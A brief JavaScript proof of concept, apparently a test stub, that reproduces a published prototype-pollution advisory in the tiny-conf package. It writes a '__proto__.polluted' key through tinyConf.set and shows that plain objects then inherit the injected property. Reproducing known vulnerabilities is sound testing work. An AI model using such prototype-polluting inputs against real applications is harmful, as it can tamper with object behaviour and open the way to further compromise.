// //https://snyk.io/vuln/SNYK-JS-TINYCONF-598792
// test("prototype pollution in tinyConf", () => {
  const tinyConf = require("tiny-conf");
  obj = {};

console.log({}.polluted);

  tinyConf.set("__proto__.polluted", "yes");
console.log({}.polluted);
// });
